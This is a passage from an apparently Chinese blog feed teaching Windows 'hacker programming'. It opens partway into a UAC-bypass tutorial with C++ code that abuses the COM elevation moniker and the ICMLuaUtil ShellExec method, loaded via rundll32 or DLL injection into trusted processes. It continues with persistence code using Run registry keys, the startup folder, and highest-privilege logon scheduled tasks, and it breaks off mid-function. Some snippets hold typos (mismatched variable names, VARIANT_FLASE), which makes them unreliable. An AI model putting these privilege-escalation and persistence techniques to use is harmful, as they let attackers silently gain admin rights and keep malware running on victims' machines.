class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">HRESULT <span class="hljs-title">CoCreateInstanceAsAdmin</span><span class="hljs-params">(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID *ppVoid)</span></span><br><span class="hljs-function"></span>&#123;<br>BIND_OPTS3 bo;<br>WCHAR wszCLSID[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>WCHAR wszMonikerName[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>HRESULT hr = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// 增加初始化COM环境</span><br>::<span class="hljs-built_in">CoInitialize</span>(<span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">// 构造字符串</span><br>::<span class="hljs-built_in">StringFromGUID2</span>(rclsid, wszCLSID, (<span class="hljs-built_in">sizeof</span>(wszCLSID) / <span class="hljs-built_in">sizeof</span>(wszCLSID[<span class="hljs-number">0</span>])));<br>hr = ::<span class="hljs-built_in">StringCchPrintfW</span>(wszMonikerName, (<span class="hljs-built_in">sizeof</span>(wszMonikerName) / <span class="hljs-built_in">sizeof</span>(wszMonikerName[<span class="hljs-number">0</span>])), <span class="hljs-string">L&quot;Elevation:Administrator!new:%s&quot;</span>, wszCLSID);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>&#123;<br><span class="hljs-keyword">return</span> hr;<br>&#125;<br><span class="hljs-comment">// 设置BIND_OPTS3</span><br>::<span class="hljs-built_in">RtlZeroMemory</span>(&amp;bo, <span class="hljs-built_in">sizeof</span>(bo));<br>bo.cbStruct = <span class="hljs-built_in">sizeof</span>(bo);<br>bo.hwnd = hWnd;<br>bo.dwClassContext = CLSCTX_LOCAL_SERVER;<br><span class="hljs-comment">// 创建名称对象并获取COM对象</span><br>hr = ::<span class="hljs-built_in">CoGetObject</span>(wszMonikerName, &amp;bo, riid, ppVoid);<br><span class="hljs-keyword">return</span> hr;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过上述方法创建并激活提升权限的COM类创建后，直接调用ICMLuaUtil接口的ShellExec方法来创建指定进程，完成BypassUAC操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CMLuaUtilBypassUAC</span><span class="hljs-params">(LPWSTR lpwszExecutable)</span></span><br><span class="hljs-function"></span>&#123;<br>HRESULT hr = <span class="hljs-number">0</span>;<br>CLSID clsidICMLuaUtil = &#123; <span class="hljs-number">0</span> &#125;;<br>IID iidICMLuaUtil = &#123; <span class="hljs-number">0</span> &#125;;<br>ICMLuaUtil *CMLuaUtil = <span class="hljs-literal">NULL</span>;<br>BOOL bRet = FALSE;<br><span class="hljs-keyword">do</span> &#123;<br>::<span class="hljs-built_in">CLSIDFromString</span>(CLSID_CMSTPLUA, &amp;clsidICMLuaUtil);<br>::<span class="hljs-built_in">IIDFromString</span>(IID_ICMLuaUtil, &amp;iidICMLuaUtil);<br><span class="hljs-comment">// 提权</span><br>hr = <span class="hljs-built_in">CoCreateInstanceAsAdmin</span>(<span class="hljs-literal">NULL</span>, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&amp;CMLuaUtil));<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">// 启动程序</span><br>hr = CMLuaUtil-&gt;lpVtbl-&gt;<span class="hljs-built_in">ShellExec</span>(CMLuaUtil, lpwszExecutable, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, SW_SHOW);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>bRet = TRUE;<br>&#125;<span class="hljs-keyword">while</span>(FALSE);<br><span class="hljs-comment">// 释放</span><br><span class="hljs-keyword">if</span> (CMLuaUtil) <br>&#123;<br>CMLuaUtil-&gt;lpVtbl-&gt;<span class="hljs-built_in">Release</span>(CMLuaUtil);<br>&#125;<br><span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果执行COM提升名称代码的程序身份是不可信的，还是会触发UAC弹窗；若是可信程序，则不会触发UAC弹窗。因此，必须使这段代码在WIndows可信程序中运行。可信程序有计算器、记事本、资源管理器、rundll32.exe等。可以通过DLL注入或是劫持技术，将这段代码注入到这些可信程序的进程空间当中。最简单的莫过于直接通过rundll32.exe来加载DLL，执行COM提升名称的代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 导出函数给rundll32.exe调用执行</span><br><span class="hljs-function"><span class="hljs-type">void</span> CALLBACK <span class="hljs-title">BypassUAC</span><span class="hljs-params">(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, <span class="hljs-type">int</span> iCmdShow)</span></span><br></code></pre></td></tr></table></figure><p><strong>测试</strong></p><p><img src="/2022/11/08/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/image-20221107164830632.png" alt="image-20221107164830632"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>实现Bypass UAC的方法很多，并不局限于白名单程序和COM接口技术。对于不同的Bypass UAC方法，其具体的实现过程大都不一样。随着操作系统的升级更新，现在对于Bypass UAC成功的方法，可能在以后不再适用，但也会有新的BypassUAC方法出现，攻与防是相互博奔的过程。</p>]]></content>
    
    
    <categories>
      
      <category>Windows黑客编程技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自启动技术</title>
    <link href="/2022/11/04/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"/>
    <url>/2022/11/04/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="第五章-自启动技术"><a href="#第五章-自启动技术" class="headerlink" title="第五章 自启动技术"></a>第五章 自启动技术</h2><h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a><strong>注册表</strong></h3><p>实现开机自启动的途径和方式有很多种，其中修改注册表方式应用最为广泛。注册表相当是操作系统的数据库，记录着系统中方方面面的数据，其中也不乏直接或间接导致开机自启动的数据。本节介绍向Run注册表中添加程序路径的方式，以实现开机自启动。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a><strong>实现原理</strong></h4><p>理解修改注册表实现开机自启动功能的一个重要前提就是，Windows提供了专门的开机自启动注册表。在每次开机完成后，它都会在这个注册表键下遍历键值，以获取键值中的程序路径，并创建进程启动程序。</p><p>本节介绍两种修改注册表的方式，它们的主要区别在于注册表键路径。本节介绍其中常见的两个路径，分别是：</p><p><strong>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</strong></p><p><strong>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</strong></p><p>在编程实现上，要修改HKEY_LOCAL_MACHINE主键的注册表，这要求程序要有管理员权限。而修改HKEY_CURRENT_USER主键<br>的注册表，只需要用户默认权限就可以实现。</p><p>如果程序运行在64位Windows系统上，则需要注意<strong>注册表重定位</strong>的问题。在64位Windows系统中，为了兼容32位程序的正常执行，64位的Windows系统采用重定向机制。系统为关键的文件夹和关键注册表创建了两个副本，使得32位程序在64位系统上不仅能操作关键文件夹和关键注册表，还可以避免与64位程序冲突。</p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a><strong>代码实现</strong></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">RegCurrentUser</span><span class="hljs-params">(<span class="hljs-type">char</span> *lpFileName, <span class="hljs-type">char</span> *lpValueName)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 默认权限</span><br>HKEY hKey;<br><span class="hljs-comment">// 打开注册表键</span><br><span class="hljs-built_in">RegOpenKeyEx</span>(HKEY_CURRENT_USER, <span class="hljs-string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>, <span class="hljs-number">0</span>, KEY_WRITE, &amp;hKey)<br><span class="hljs-comment">// 修改注册表值，实现开机自启</span><br><span class="hljs-built_in">RegSetValueEx</span>(hKey, lpszValueName, <span class="hljs-number">0</span>, REG_SZ, (BYTE *)lpszFileName, (<span class="hljs-number">1</span> + <span class="hljs-built_in">lstrlen</span>(lpszFileName)))<br><span class="hljs-comment">// 关闭注册表键</span><br><span class="hljs-built_in">RegCloseKey</span>(hKey);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-comment">// 需管理员权限的路径</span><br><span class="hljs-function">BOOL <span class="hljs-title">RegLocalMachine</span><span class="hljs-params">(<span class="hljs-type">char</span> *lpFileName, <span class="hljs-type">char</span> *lpValueName)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 管理员权限</span><br>HKEY hKey;<br><span class="hljs-comment">// 打开注册表键</span><br><span class="hljs-built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, <span class="hljs-string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>, <span class="hljs-number">0</span>, KEY_WRITE, &amp;hKey)<br><span class="hljs-comment">// 修改注册表值，实现开机自启</span><br><span class="hljs-built_in">RegSetValueEx</span>(hKey, lpszValueName, <span class="hljs-number">0</span>, REG_SZ, (BYTE *)lpszFileName, (<span class="hljs-number">1</span> + <span class="hljs-built_in">lstrlen</span>(lpszFileName)))<br><span class="hljs-comment">// 关闭注册表键</span><br><span class="hljs-built_in">RegCloseKey</span>(hKey);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="快速启动目录"><a href="#快速启动目录" class="headerlink" title="快速启动目录"></a>快速启动目录</h3><p>快速启动目录是一种实现起来最为简单的，不用修改任何系统数据的自启动方法。</p><h4 id="实现原理-1"><a href="#实现原理-1" class="headerlink" title="实现原理"></a><strong>实现原理</strong></h4><p>Windows系统有自带的快速启动的文件夹，它是最为简单的自启动方式，只要把程序放入到这个快速启动文件夹中，系统在启动时就会自动地加载并运行相应的程序，实现开机自启动功能。</p><p>快速启动目录并不是一个固定地目录，每台计算机都不相同，但是可以使用 <strong>SHGetSpecialFolderPath</strong> 函数获取Windows系统中快速启动目录的路径，快速启动目录的CSIDL标识值为CSIDL_STARTUP。</p><p>然后，使用CopyFile函数，将想要自启动的程序复制到快速启动目录下即可。当然，为程序创建快捷方式，并把快捷方式放入到快速启动自录中，也同样可以达到开机自启动的效果。</p><h4 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a><strong>代码实现</strong></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">AutoRun_Startup</span><span class="hljs-params">(<span class="hljs-type">char</span> *lpszSrcFilePath, <span class="hljs-type">char</span> *lpszDestFileName)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL bRet = FALSE;<br><span class="hljs-type">char</span> szStartupPath[MAX_PATH] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">char</span> szDestFilePath[MAX_PATH] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-comment">// 获取 快速启动目录 路径</span><br>bRet = <span class="hljs-built_in">SHGetSpecialFolderPath</span>(<span class="hljs-literal">NULL</span>, szStartupPath, CSIDL_STARTUP, TRUE);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;szStartupPath=%s\n&quot;</span>, szStartupPath);<br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 构造拷贝的 目的文件路径</span><br><span class="hljs-built_in">wsprintf</span>(szDestFilePath, <span class="hljs-string">&quot;%s\\%s&quot;</span>, szStartupPath, lpszDestFileName);<br><span class="hljs-comment">// 拷贝文件到快速启动目录下</span><br>bRet = <span class="hljs-built_in">CopyFile</span>(lpszSrcFilePath, szDestFilePath, FALSE);<br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>Windows系统可以设置计划任务来执行一些定时任务。设置计划任务的触发条件为在用户登录时触发，执行启动指定路径程序的操作，从而实现开机自启动。</p><h4 id="实现原理及代码"><a href="#实现原理及代码" class="headerlink" title="实现原理及代码"></a><strong>实现原理及代码</strong></h4><p>使用WindowsShell编程实现创建计划任务时，会涉及COM组件接口的调用。要注意的是，编程实现创建计划任务要求具有<strong>管理员权限</strong>。</p><h5 id="1-初始化操作"><a href="#1-初始化操作" class="headerlink" title="1.初始化操作"></a><strong>1.初始化操作</strong></h5><p>​首先，通过CoInitialize函数来初始化COM接口环境。<br>​其次，调用CoCrateInstance函数创建任务服务对象ITaskService，并将其连接到任务服务上。<br>​最后，从ITaskService对象中获取根任务Root Task Folder的指针对象ITaskFolder，这个指针指向的是新注册的任务。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++">CMyTaskSchedule::<span class="hljs-built_in">CMyTaskSchedule</span>(<span class="hljs-type">void</span>)<br>&#123;<br>    m_lpITS = <span class="hljs-literal">NULL</span>;<br>    m_lpRootFolder = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">// 初始化COM</span><br>    HRESULT hr = ::<span class="hljs-built_in">CoInitialize</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;CoInitialize&quot;</span>, hr);<br>    &#125;<br><br>    <span class="hljs-comment">// 创建一个任务服务实例</span><br>    hr = ::<span class="hljs-built_in">CoCreateInstance</span>(CLSID_TaskScheduler, <span class="hljs-literal">NULL</span>, CLSCTX_INPROC_SERVER, IID_ITaskService, (LPVOID *)(&amp;m_lpITS));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;CoCreateInstance&quot;</span>, hr);<br>    &#125;<br><br>    <span class="hljs-comment">// 连接到任务服务</span><br>    hr = m_lpITS-&gt;<span class="hljs-built_in">Connect</span>(<span class="hljs-type">_variant_t</span>(), <span class="hljs-type">_variant_t</span>(), <span class="hljs-type">_variant_t</span>(), <span class="hljs-type">_variant_t</span>());<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;ITaskService::Connect&quot;</span>, hr);<br>    &#125;<br><br>    <span class="hljs-comment">// 获取Root Task Folder的指针，这个指针指向的是新注册的服务</span><br>    hr = m_lpITS-&gt;<span class="hljs-built_in">GetFolder</span>(<span class="hljs-type">_bstr_t</span>(<span class="hljs-string">&quot;\\&quot;</span>), &amp;m_lpRootFolder);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;ITaskService::GetFolder&quot;</span>, hr);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-创建任务计划操作（重点）"><a href="#2-创建任务计划操作（重点）" class="headerlink" title="2.创建任务计划操作（重点）"></a><strong>2.创建任务计划操作</strong>（重点）</h5><p>​首先，从ITaskService对象中创建一个任务定义对象ITaskDefinition，它用来创建任务。<br>​然后，对任务定义对象ITaskDefinition进行设置：<br>​设置注册信息，包括设置作者信息。<br>​设置主体信息，包括登录类型、运行权限。<br>​设置配置信息，包括在使用电池运行时是否停止、是否允许使用电池运行、是否手动运行、是否设置多个实例等。<br>​设置操作信息，包括启动程序，并设置运行程序的路径和参数等。<br>​设置触发器信息，包括用户登录时触发。<br>​最后，使用ITaskFolder对象并利用任务定义对象ITaskDefinition的设置，注册任务计划。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CMyTaskSchedule::NewTask</span><span class="hljs-params">(<span class="hljs-type">char</span> *lpszTaskName, <span class="hljs-type">char</span>* lpszProgramPath, <span class="hljs-type">char</span>* lpszParameters, <span class="hljs-type">char</span> *lpszAuthor)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == m_lpRootFolder)<br>    &#123;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果存在相同的计划任务，则删除</span><br>    <span class="hljs-built_in">Delete</span>(lpszTaskName);<br><br>    <span class="hljs-comment">// 创建任务定义对象</span><br>    ITaskDefinition *pTaskDefinition = <span class="hljs-literal">NULL</span>;<br>    HRESULT hr = m_lpITS-&gt;<span class="hljs-built_in">NewTask</span>(<span class="hljs-number">0</span>, &amp;pTaskDefinition);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;ITaskService::NewTask&quot;</span>, hr);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">// 设置注册信息</span><br>    IRegistrationInfo *pRegInfo = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-function">CComVariant <span class="hljs-title">variantAuthor</span><span class="hljs-params">(<span class="hljs-literal">NULL</span>)</span></span>;<br>    variantAuthor = lpszAuthor;<br>    hr = pTaskDefinition-&gt;<span class="hljs-built_in">get_RegistrationInfo</span>(&amp;pRegInfo);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;ITaskDefinition::get_RegistrationInfo&quot;</span>, hr);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">// 设置作者信息</span><br>    hr = pRegInfo-&gt;<span class="hljs-built_in">put_Author</span>(variantAuthor.bstrVal);<br>    pRegInfo-&gt;<span class="hljs-built_in">Release</span>();<br><br>    <span class="hljs-comment">// 设置登录类型和运行权限</span><br>    IPrincipal *pPrincipal = <span class="hljs-literal">NULL</span>;<br>    hr = pTaskDefinition-&gt;<span class="hljs-built_in">get_Principal</span>(&amp;pPrincipal);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;ITaskDefinition::get_Principla&quot;</span>, hr);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">// 设置登录类型</span><br>    hr = pPrincipal-&gt;<span class="hljs-built_in">put_LogonType</span>(TASK_LOGON_INTERACTIVE_TOKEN);<br>    <span class="hljs-comment">// 设置运行权限 - 最高权限</span><br>    hr = pPrincipal-&gt;<span class="hljs-built_in">put_RunLevel</span>(TASK_RUNLEVEL_HIGHEST);<br>    pPrincipal-&gt;<span class="hljs-built_in">Release</span>();<br><br>    <span class="hljs-comment">// 设置其他信息</span><br>    ITaskSetting* pSetting = <span class="hljs-literal">NULL</span>;<br>    hr = pTaskDefinition-&gt;<span class="hljs-built_in">get_Settings</span>(&amp;pSetting);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;ITaskDefinition::get_Setttings&quot;</span>, hr);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">// 设置其他信息</span><br>    hr = pSetting-&gt;<span class="hljs-built_in">put_StopIfGoingOnBatteries</span>(VARIANT_FALSE);<br>    hr = pSetting-&gt;<span class="hljs-built_in">put_DisallowStartIfOnBatteries</span>(VARIANT_FALSE);<br>    hr = pSetting-&gt;<span class="hljs-built_in">put_AllowDemandStart</span>(VARIANT_TRUE);<br>    hr = pSetting-&gt;<span class="hljs-built_in">put_StartWhenAvailable</span>(VARIANT_FLASE);<br>    hr = pSetting-&gt;<span class="hljs-built_in">put_MultipleInstance</span>(TASK_INSTANCES_PARALLEL);<br>    pSetting-&gt;<span class="hljs-built_in">Release</span>();<br><br>    <span class="hljs-comment">// 创建执行动作集</span><br>    IActionCollection *pActionCollect = <span class="hljs-literal">NULL</span>;<br>    hr = pTaskDefinition-&gt;<span class="hljs-built_in">get_Actions</span>(&amp;pActionCollect);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;ITaskDefinition::get_Actions&quot;</span>, hr);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    IAction* pAction = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">// 创建执行操作</span><br>    hr = pActionCollect-&gt;<span class="hljs-built_in">Create</span>(TASK_ACTION_EXEC, &amp;pAction);<br>    pActionCollect-&gt;<span class="hljs-built_in">Release</span>();<br><br>    <span class="hljs-comment">// 设置执行程序路径和参数</span><br>    <span class="hljs-function">CComVariant <span class="hljs-title">variantProgramPath</span><span class="hljs-params">(<span class="hljs-literal">NULL</span>)</span></span>;<br>    <span class="hljs-function">CComVariant <span class="hljs-title">variantParameters</span><span class="hljs-params">(<span class="hljs-literal">NULL</span>)</span></span>;<br>    IExecAction *pExecAction = <span class="hljs-literal">NULL</span>;<br>    hr = pAction-&gt;<span class="hljs-built_in">QueryInterface</span>(IID_IExecAction, (PVOID *)(&amp;pExecAction));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        pAction-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;IAction::QueryInterface&quot;</span>, hr);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    pAction-&gt;<span class="hljs-built_in">Release</span>();<br><br>    <span class="hljs-comment">// 设置程序路径和参数</span><br>    variantProgramPath = lpszProgramPath;<br>    variantParameters = lpszParameters;<br>    pExecAction-&gt;<span class="hljs-built_in">put_Path</span>(variantProgramPath);<br>    pExecAction-&gt;<span class="hljs-built_in">put_Arguments</span>(variantPraameters.bstrVal);<br>    pExecAction-&gt;<span class="hljs-built_in">Release</span>();<br><br>    <span class="hljs-comment">// 创建触发器，实现用户登录自启动</span><br>    ITriggerCollection *pTriggers = <span class="hljs-literal">NULL</span>;<br>    hr = pTaskDefinition-&gt;<span class="hljs-built_in">get_Triggers</span>(&amp;pTriggers);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;ITaskDefinition::get_Triggers&quot;</span>, hr);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">// 创建触发器</span><br>    ITrigger *pTrigger = <span class="hljs-literal">NULL</span>;<br>    hr = pTriggers-&gt;<span class="hljs-built_in">Create</span>(TASK_TRIGGER_LOGON, &amp;pTrigger);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;ITriggerCollection::Create&quot;</span>, hr);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">// 注册任务计划</span><br>    IRegisteredTask 